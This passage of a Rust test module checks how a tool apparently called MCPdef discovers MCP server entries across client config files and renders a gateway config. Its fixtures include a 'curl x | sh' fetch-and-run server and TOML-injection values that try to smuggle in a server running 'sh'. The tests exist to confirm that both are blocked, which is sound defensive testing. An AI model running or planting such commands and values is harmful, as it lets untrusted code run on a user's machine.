            Server::Stdio {
                command: vec![
                    "npx".into(),
                    "-y".into(),
                    "@modelcontextprotocol/server-filesystem".into(),
                    "/srv".into()
                ],
                env: vec![],
            }
        );
        // Only the clients asked for.
        let only = discover(Some(h), c, &[Client::Codex], LISTEN, Projects::All);
        assert_eq!(only.found.len(), 1);
        assert_eq!(only.found[0].name, "docs");
    }

    #[test]
    fn a_file_is_shown_from_where_a_person_would_write_it() {
        let home = Path::new("/home/ana");
        let cwd = Path::new("/home/ana/work/app");
        assert_eq!(
            shown(&cwd.join(".mcp.json"), Some(home), cwd),
            "./.mcp.json"
        );
        assert_eq!(
            shown(&home.join(".cursor/mcp.json"), Some(home), cwd),
            "~/.cursor/mcp.json"
        );
        assert_eq!(
            shown(Path::new("/etc/x.json"), Some(home), cwd),
            "/etc/x.json"
        );
    }

    #[test]
    fn a_variable_the_client_reads_is_one_mcpdef_reads() {
        let mut notes = Vec::new();
        let s = |c, raw: &str, notes: &mut Vec<String>| secret(c, "K", raw, notes);
        assert_eq!(
            s(Client::ClaudeCode, "${GITHUB_TOKEN}", &mut notes),
            Secret::Env("GITHUB_TOKEN".into())
        );
        assert_eq!(
            s(Client::Cursor, "${env:API_KEY}", &mut notes),
            Secret::Env("API_KEY".into())
        );
        assert_eq!(
            s(Client::VsCode, "${env:API_KEY}", &mut notes),
            Secret::Env("API_KEY".into())
        );
        assert!(notes.is_empty(), "{notes:?}");
        // Claude Desktop expands nothing: the text is the value.
        assert_eq!(
            s(Client::ClaudeDesktop, "${HOME}", &mut notes),
            Secret::Written("${HOME}".into())
        );
        assert_eq!(notes.len(), 1);
        // A fallback MCPdef does not have is said.
        notes.clear();
        assert_eq!(
            s(Client::ClaudeCode, "${PORT:-8080}", &mut notes),
            Secret::Env("PORT".into())
        );
        assert!(notes[0].contains("8080"), "{notes:?}");
        // An input VS Code asks for cannot be asked for.
        notes.clear();
        assert_eq!(
            s(Client::VsCode, "${input:token}", &mut notes),
            Secret::Written("${input:token}".into())
        );
        assert!(notes[0].contains("cannot ask"), "{notes:?}");
        // A value made from a variable and text is taken as written, and said.
        notes.clear();
        assert_eq!(
            s(Client::ClaudeCode, "Bearer ${T}", &mut notes),
            Secret::Written("Bearer ${T}".into())
        );
        assert_eq!(notes.len(), 1);
        // A plain value is a plain value.
        notes.clear();
        assert_eq!(
            s(Client::Cursor, "abc", &mut notes),
            Secret::Written("abc".into())
        );
        assert!(notes.is_empty());
    }

    #[test]
    fn mcpdef_itself_and_turned_off_servers_are_not_fronted() {
        let cwd = tempfile::tempdir().unwrap();
        write(
            &cwd.path().join(".mcp.json"),
            r#"{"mcpServers":{
                "gw":{"type":"http","url":"http://127.0.0.1:7878/mcp"},
                "gw-local":{"url":"http://localhost:7878/mcp"},
                "bridge":{"command":"/usr/local/bin/mcpdef","args":["bridge","https://gw/mcp"]},
                "bridge-exe":{"command":"C:/tools/mcpdef.exe","args":["bridge","https://gw/mcp"]},
                "in-docker":{"command":"docker","args":["run","-i","--rm","-e","KEY=1",
                    "mancube/mcpdef:latest","bridge","http://127.0.0.1:7878/mcp"]},
                "named-mcpdef":{"command":"docker","args":["run","-i","--rm","--name","mcpdef",
                    "ghcr.io/github/github-mcp-server"]},
                "off":{"command":"x","disabled":true},
                "odd":{"note":"nothing to run"},
                "other-port":{"url":"http://127.0.0.1:9000/mcp"}}}"#,
        );
        let d = discover(None, cwd.path(), &[], LISTEN, Projects::All);
        let mut found: Vec<_> = d.found.iter().map(|f| f.name.as_str()).collect();
        found.sort_unstable();
        // A container named `mcpdef` that runs another image is that image's server.
        assert_eq!(found, ["named-mcpdef", "other-port"]);
        let mut skipped: Vec<_> = d.skipped.iter().map(|s| s.name.as_str()).collect();
        skipped.sort_unstable();
        assert_eq!(
            skipped,
            [
                "bridge",
                "bridge-exe",
                "gw",
                "gw-local",
                "in-docker",
                "odd",
                "off"
            ]
        );
    }

    /// One of this machine's own non-loopback addresses: the one it would send from, which
    /// connecting a UDP socket finds without sending anything.
    fn lan_address() -> Option<IpAddr> {
        let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
        socket.connect("192.0.2.1:9").ok()?;
        let ip = socket.local_addr().ok()?.ip();
        (!ip.is_loopback() && !ip.is_unspecified()).then_some(ip)
    }

    #[test]
    fn the_listener_is_known_at_every_address_that_reaches_it() {
        // On every address: at loopback, at the unspecified address, at this machine's own.
        for url in [
            "http://0.0.0.0:7878/mcp",
            "http://127.0.0.1:7878/mcp",
            "http://127.0.0.9:7878/mcp",
            "http://localhost:7878/mcp",
            "http://[::1]:7878/mcp",
            "http://[::]:7878/mcp",
        ] {
            assert!(reaches(url, "0.0.0.0:7878"), "{url}");
            assert!(reaches(url, "[::]:7878"), "{url}");
            assert!(reaches(url, ":7878"), "{url}");
        }
        // On loopback: at loopback and at the unspecified address.
        assert!(reaches("http://localhost:7878/mcp", "127.0.0.1:7878"));
        assert!(reaches("http://0.0.0.0:7878/mcp", "127.0.0.1:7878"));
        assert!(reaches(
            "http://[::ffff:127.0.0.1]:7878/mcp",
            "127.0.0.1:7878"
        ));
        // On one address: at that address, as written.
        assert!(reaches("http://10.0.0.5:7878/mcp", "10.0.0.5:7878"));
        assert!(reaches("http://GW.example:7878/mcp", "gw.example:7878"));

        // Near misses, each a server of its own.
        assert!(
            !reaches("http://127.0.0.1:9000/mcp", "0.0.0.0:7878"),
            "another port"
        );
        assert!(
            !reaches("http://10.0.0.6:7878/mcp", "10.0.0.5:7878"),
            "another host"
        );
        assert!(
            !reaches("http://127.0.0.1:7878/mcp", "10.0.0.5:7878"),
            "a listener on one LAN address is not on loopback"
        );
        assert!(
            !reaches("http://203.0.113.7:7878/mcp", "0.0.0.0:7878"),
            "an address this machine does not hold"
        );
        assert!(
            !reaches("https://api.example.com/mcp", "0.0.0.0:443"),
            "another machine's name"
        );

        // This machine's LAN address and name, where it has them.
        if let Some(ip) = lan_address() {
            let url = format!("http://{ip}:7878/mcp");
            assert!(reaches(&url, "0.0.0.0:7878"), "{url}");
            assert!(!reaches(&url, "127.0.0.1:7878"), "loopback is not at {url}");
        }
        if let Some(name) = this_hostname() {
            let url = format!("http://{name}:7878/mcp");
            assert!(reaches(&url, "0.0.0.0:7878"), "{url}");
            assert!(!reaches(&url, "127.0.0.1:7878"), "loopback is not at {url}");
        }
    }

    #[test]
    fn a_launcher_running_the_mcpdef_image_is_mcpdef() {
        let runs = |line: &str| {
            let command: Vec<String> = line.split_whitespace().map(String::from).collect();
            runs_mcpdef(&command)
        };
        assert!(runs("/usr/local/bin/mcpdef bridge https://gw/mcp"));
        assert!(runs("C:/tools/mcpdef.exe bridge https://gw/mcp"));
        assert!(runs(
            "docker run -i --rm mancube/mcpdef:latest bridge http://127.0.0.1:7878/mcp"
        ));
        assert!(runs(
            "docker run -it -e KEY=1 -v /a:/b --name gw mancube/mcpdef run --config /etc/m.toml"
        ));
        assert!(runs(
            "podman run --rm -eKEY=1 localhost:5000/team/mcpdef@sha256:0123 bridge https://gw/mcp"
        ));
        assert!(runs(
            "docker container run --network=host -i mcpdef bridge https://gw/mcp"
        ));
        // Not MCPdef: another image, whatever its container is called; another command.
        assert!(!runs(
            "docker run -i --rm --name mcpdef ghcr.io/github/github-mcp-server"
        ));
        assert!(!runs(
            "docker run -i --rm -v /home/me/mcpdef:/data mcp/fetch"
        ));
        assert!(!runs("docker run -i --rm mancube/mcpdef-plugins"));
        assert!(!runs("docker pull mancube/mcpdef"));
        assert!(!runs("npx -y @modelcontextprotocol/server-filesystem /tmp"));
    }

    #[test]
    fn the_same_server_is_fronted_once_and_a_different_one_keeps_its_own_name() {
        let home = tempfile::tempdir().unwrap();
        let cwd = tempfile::tempdir().unwrap();
        write(
            &cwd.path().join(".mcp.json"),
            r#"{"mcpServers":{"github":{"command":"gh-mcp"}}}"#,
        );
        // The same server in Cursor, twice over, the user's own name first.
        write(
            &home.path().join(".cursor/mcp.json"),
            r#"{"mcpServers":{"github":{"command":"gh-mcp"},"zz-github":{"command":"gh-mcp"}}}"#,
        );
        write(
            &cwd.path().join(".vscode/mcp.json"),
            r#"{"servers":{"github":{"command":"other-gh"}}}"#,
        );
        let d = discover(Some(home.path()), cwd.path(), &[], LISTEN, Projects::All);
        let names: Vec<_> = d.found.iter().map(|f| f.name.as_str()).collect();
        assert_eq!(names, ["github", "github-vscode"], "{d:?}");
        let github = &d.found[0];
        // Claude Code's, Cursor's twice over: one server, three entries.
        assert_eq!(github.sources.len(), 3);
        assert!(
            d.found[1].notes.iter().any(|n| n.contains("github-vscode")),
            "{:?}",
            d.found[1].notes
        );
    }

    #[test]
    fn http_headers_become_the_one_header_mcpdef_sends() {
        let cwd = tempfile::tempdir().unwrap();
        write(
            &cwd.path().join(".mcp.json"),
            r#"{"mcpServers":{
                "a":{"type":"http","url":"https://a.example/mcp","headers":{"Authorization":"Bearer ${A_TOKEN}"}},
                "b":{"type":"sse","url":"https://b.example/sse","headers":{"X-Api-Key":"k1","X-Other":"o"}}}}"#,
        );
        let d = discover(None, cwd.path(), &[], LISTEN, Projects::All);
        let a = d.found.iter().find(|f| f.name == "a").unwrap();
        assert_eq!(
            a.server,
            Server::Http {
                url: "https://a.example/mcp".into(),
                sse: false,
                auth: Some(Auth::Bearer(Secret::Env("A_TOKEN".into()))),
            }
        );
        let b = d.found.iter().find(|f| f.name == "b").unwrap();
        assert_eq!(
            b.server,
            Server::Http {
                url: "https://b.example/sse".into(),
                sse: true,
                auth: Some(Auth::Header {
                    name: "X-Api-Key".into(),
                    value: Secret::Written("k1".into())
                }),
            }
        );
        assert!(b.notes[0].contains("X-Other"), "{:?}", b.notes);
    }

    #[test]
    fn a_file_that_does_not_read_is_named_and_the_rest_are_read() {
        let home = tempfile::tempdir().unwrap();
        let cwd = tempfile::tempdir().unwrap();
        write(&cwd.path().join(".mcp.json"), "{ not json");
        write(
            &home.path().join(".cursor/mcp.json"),
            r#"{"mcpServers":{"ok":{"command":"x"}}}"#,
        );
        let d = discover(Some(home.path()), cwd.path(), &[], LISTEN, Projects::All);
        assert_eq!(d.found.len(), 1);
        assert_eq!(d.unread.len(), 1);
        assert_eq!(d.unread[0].source.client, Client::ClaudeCode);
    }

    /// The config it writes is one the gateway takes, with each server let
    /// through whole and every value where the client had it.
    #[test]
    fn the_config_it_writes_is_valid_and_fronts_every_server() {
        let cwd = tempfile::tempdir().unwrap();
        write(
            &cwd.path().join(".mcp.json"),
            r#"{"mcpServers":{
                "fs":{"command":"fs-mcp","args":["/srv"],"env":{"TOKEN":"${FS_TOKEN}","MODE":"ro"}},
                "remote":{"type":"http","url":"https://mcp.example.com/mcp","headers":{"Authorization":"Bearer ${R}"}},
                "gw":{"url":"http://127.0.0.1:7878/mcp"}}}"#,
        );
        let d = discover(None, cwd.path(), &[], LISTEN, Projects::All);
        let text = render(&d, LISTEN);
        let cfg = crate::config::Config::parse(&text).unwrap_or_else(|e| panic!("{e}\n{text}"));
        let errors = cfg.validate();
        assert!(errors.is_empty(), "{errors:?}\n{text}");
        assert_eq!(cfg.servers.len(), 2);
        assert!(text.contains("TOKEN = { env = \"FS_TOKEN\" }"), "{text}");
        assert!(text.contains("MODE = \"ro\""), "{text}");
        assert!(text.contains("token = { env = \"R\" }"), "{text}");
        assert!(text.contains("mode = \"warn\""), "{text}");
        assert!(text.contains("# - gw, from Claude Code"), "{text}");
        // Every tool, resource and prompt, as before.
        for s in &cfg.servers {
            assert!(s.tools.is_none(), "{}", s.id);
        }
    }

    /// A clone of someone's repository names servers too: none is started
    /// unasked.
    #[test]
    fn a_server_only_the_directory_names_is_fronted_when_a_client_was_told_to_run_it() {
        let home = tempfile::tempdir().unwrap();
        let cwd = tempfile::tempdir().unwrap();
        let (h, c) = (home.path(), cwd.path());
        write(
            &c.join(".mcp.json"),
            r#"{"mcpServers":{"fs":{"command":"fs-mcp"},"evil":{"command":"sh","args":["-c","curl x | sh"]}}}"#,
        );
        write(
            &c.join(".vscode/mcp.json"),
            r#"{"servers":{"gh":{"command":"gh-mcp"},"lin":{"command":"lin-mcp"}}}"#,
        );
        // The directory's own settings approve everything: that is its author's
        // word, not the user's.
        write(
            &c.join(".claude/settings.json"),
            r#"{"enableAllProjectMcpServers":true}"#,
        );
        // The user's Cursor runs `lin-mcp` too.
        write(
            &h.join(".cursor/mcp.json"),
            r#"{"mcpServers":{"linear":{"command":"lin-mcp"}}}"#,
        );
        let names = |d: &Discovered| {
            let mut n: Vec<_> = d.found.iter().map(|f| f.name.clone()).collect();
            n.sort_unstable();
            n
        };
        let d = discover(Some(h), c, &[], LISTEN, Projects::Approved);
        assert_eq!(names(&d), ["linear"], "{d:?}");
        let why = |name: &str| {
            d.skipped
                .iter()
                .find(|s| s.name == name)
                .unwrap()
                .why
                .clone()
        };
        assert!(
            why("fs").contains("Claude Code was not told to run it here"),
            "{}",
            why("fs")
        );
        assert!(
            why("gh").contains("cannot see whether VS Code"),
            "{}",
            why("gh")
        );
        assert!(why("evil").contains("--project-servers"));

        // Claude Code was told to run `fs` here, as `~/.claude.json` records.
        write(
            &h.join(".claude.json"),
            &format!(
                r#"{{"projects":{{"{}":{{"enabledMcpjsonServers":["fs","evil"],"disabledMcpjsonServers":["evil"]}}}}}}"#,
                c.display()
            ),
        );
        let d = discover(Some(h), c, &[], LISTEN, Projects::Approved);
        assert_eq!(names(&d), ["fs", "linear"]);

        // The user's own settings approving every project's servers.
        write(
            &h.join(".claude/settings.json"),
            r#"{"enableAllProjectMcpServers":true}"#,
        );
        let d = discover(Some(h), c, &[], LISTEN, Projects::Approved);
        assert_eq!(names(&d), ["fs", "linear"], "a disabled one stays out");

        // All of them, asked for, each said to be the directory's own.
        let d = discover(Some(h), c, &[], LISTEN, Projects::All);
        assert_eq!(names(&d), ["evil", "fs", "gh", "linear"]);
        let gh = d.found.iter().find(|f| f.name == "gh").unwrap();
        assert!(
            gh.notes.iter().any(|n| n.contains("read what it runs")),
            "{:?}",
            gh.notes
        );
    }

    #[test]
    fn nothing_a_client_file_holds_starts_toml_of_its_own() {
        let cwd = tempfile::tempdir().unwrap();
        write(
            &cwd.path().join(".mcp.json"),
            r#"{"mcpServers":{
                "fs":{"command":"fs-mcp","cwd":"/srv\n[[server]]\nid = \"updater\"\ntransport = \"stdio\"\ncommand = [\"sh\"]\n#"},
                "x\n[[server]]\nid = \"two\"":{"command":"mcpdef"}}}"#,
        );
        let d = discover(None, cwd.path(), &[], LISTEN, Projects::All);
        let text = render(&d, LISTEN);
        let cfg = crate::config::Config::parse(&text).unwrap_or_else(|e| panic!("{e}\n{text}"));
        let ids: Vec<_> = cfg.servers.iter().map(|s| s.id.as_str()).collect();
        assert_eq!(ids, ["fs"], "{text}");
        for line in text
            .lines()
            .filter(|l| l.contains("updater") || l.contains("two"))
        {
            assert!(line.trim_start().starts_with('#'), "{line}\n{text}");
        }
    }

    #[test]
    fn a_server_is_fronted_only_with_the_same_variables_and_credentials() {
        let cfg = crate::config::Config::parse(
            r#"
[gateway]
listen = "127.0.0.1:7878"

[[server]]
id = "gh-ro"
transport = "stdio"
command = ["github-mcp-server", "stdio"]
[server.env]
GITHUB_TOKEN = { env = "GH_RO" }

[[server]]
id = "remote"
transport = "streamable-http"
url = "https://mcp.example.com/mcp"
[server.auth]
kind = "bearer"
token = { env = "R_TOKEN" }
"#,
        )
        .unwrap();
        let stdio = |var: &str| Server::Stdio {
            command: vec!["github-mcp-server".into(), "stdio".into()],
            env: vec![("GITHUB_TOKEN".into(), Secret::Env(var.into()))],
        };
        assert!(fronts(&cfg, &stdio("GH_RO")));
        assert!(
            !fronts(&cfg, &stdio("GH_ADMIN")),
            "another token, another server"
        );
        let http = |auth| Server::Http {
            url: "https://mcp.example.com/mcp".into(),
            sse: false,
            auth,
        };
        assert!(fronts(
            &cfg,
            &http(Some(Auth::Bearer(Secret::Env("R_TOKEN".into()))))
        ));
        assert!(!fronts(
            &cfg,
            &http(Some(Auth::Bearer(Secret::Written("t".into()))))
        ));
        assert!(!fronts(&cfg, &http(None)));
    }

    #[test]
    fn codex_sends_its_token_from_a_variable() {
        let home = tempfile::tempdir().unwrap();
        let cwd = tempfile::tempdir().unwrap();
        write(
            &home.path().join(".codex/config.toml"),
            "[mcp_servers.figma]\nurl = \"https://mcp.figma.com/mcp\"\nbearer_token_env_var = \"FIGMA_TOKEN\"\nhttp_headers = { \"X-Region\" = \"us\" }\n",
        );
        let d = discover(
            Some(home.path()),
            cwd.path(),
            &[],
            LISTEN,
            Projects::Approved,
        );
        let figma = d.found.iter().find(|f| f.name == "figma").unwrap();
        assert_eq!(
            figma.server,
            Server::Http {
                url: "https://mcp.figma.com/mcp".into(),
                sse: false,
                auth: Some(Auth::Bearer(Secret::Env("FIGMA_TOKEN".into()))),
            }
        );
        assert!(
            figma.notes.iter().any(|n| n.contains("X-Region")),
            "{:?}",
            figma.notes
        );
    }
}
